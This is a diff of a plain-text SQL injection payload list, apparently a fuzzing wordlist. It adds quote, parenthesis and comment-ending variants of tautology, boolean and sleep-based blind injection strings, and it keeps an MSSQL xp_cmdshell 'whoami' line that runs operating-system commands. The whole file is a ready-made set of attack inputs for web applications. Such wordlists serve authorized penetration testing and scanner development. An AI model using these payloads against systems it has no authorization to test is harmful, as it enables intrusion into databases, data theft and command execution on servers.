@@ -1,17 +1,51 @@
 a' or 1=1#
+a' or 1=1%23
 a' or 1=1 -- 
+a" or 1=1#
+a" or 1=1%23
+a" or 1=1 -- 
 a' or 2=2 LIMIT 1#
-a' or 2=2 LIMIT 1-- 
+a' or 2=2 LIMIT 1%23
+a' or 2=2 LIMIT 1 -- 
 a' or 'a'='a
 a' and 1=1#
 a' and 1=2#
+a' and 1=1%23
+a' and 1=2%23
 a' and 1=1 -- 
 a' and 1=2 -- 
-a' and sleep(2)#
 1 or 1=1#
+1 or 1=1%23
 1 or 1=1 -- 
 1 and 1=1#
 1 and 1=2#
+1 and 1=1%23
+1 and 1=2%23
 1 and 1=1 -- 
 1 and 1=2 -- 
+a') or 1=1#
+a') or 1=1%23
+a') or 1=1 -- 
+a") or 1=1#
+a") or 1=1%23
+a") or 1=1 -- 
 m' exec master..xp_cmdshell 'whoami' -- 
+a' or sleep(1)#
+a' or sleep(1) -- 
+a" or sleep(1)#
+a" or sleep(1)%23
+a" or sleep(1) -- 
+a' and sleep(1)#
+1 and sleep(1)#
+1 or sleep(1)#
+a' and sleep(1)%23
+1 and sleep(1)%23
+1 or sleep(1)%23
+1 and sleep(1) -- 
+1 or sleep(1) -- 
+a') or sleep(1)#
+a') or sleep(1)%23
+a') or sleep(1) -- 
+a") or sleep(1)#
+a") or sleep(1)%23
+a") or sleep(1) -- 
